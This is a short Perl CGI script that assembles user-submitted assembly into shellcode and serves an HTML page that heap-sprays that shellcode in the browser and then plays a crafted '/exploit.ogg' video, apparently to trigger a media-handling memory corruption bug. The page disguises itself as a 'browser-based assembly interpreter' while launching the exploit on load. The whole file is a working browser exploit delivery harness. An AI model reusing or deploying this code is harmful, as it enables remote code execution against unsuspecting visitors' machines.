#!/usr/bin/perl -w

use CGI;
use File::Temp qw/ tempfile /;

$q = CGI->new;

print $q->header;
$asm = $q->param('asm');

($asm_filefh,$asm_file_name) = tempfile();
($bin_filefh,$bin_file_name) = tempfile();
print $asm_filefh $asm;
$out = `nasm $asm_file_name -o $bin_file_name 2>&1`;
if ($?) {
    print "your assembly had a syntax error:<br>$out\n";
} else {
    $shellcode = `od -tx2 $bin_file_name | cut -c8-80 | sed -Ee's/ +/ /g' | sed -Ee's/ \$//g' | sed -e's/ /\\\\u/g' | tr -d '\n'`;

    print <<HTML;
<html>
    Intializing browser-based assembly interpreter (takes approx 5 secs)...
    <br>
    <body onload="exploit()">
    <script>



        shellcode = 
HTML
    print "\"$shellcode\";\n";

    print <<HTML;
        function allocStuff() {
            for(S="\\ud9d0",k=[],y=0;y++<10000;)
                if(y<10)
                    S+=S;
                else
                    k[y]=[S.substr(100)+shellcode].join("");
        }

        function playVideo() {
            for(S="\\ud9d0",k=[],y=0;y++<500;)
                if(y<20)
                    S+=S;
                else
                    k[y]=[S.substr(68)+shellcode].join("");
            var v = document.getElementsByTagName("video")[0];
            v.play();
        }

        function exploit() {
            setInterval("allocStuff()",1);
            setTimeout("playVideo()",5000);
        }
    </script>
    <video controls preload="none">
        <source src="/exploit.ogg" type="video/ogg"/>
    </video>
    </body>
</html>
HTML
}
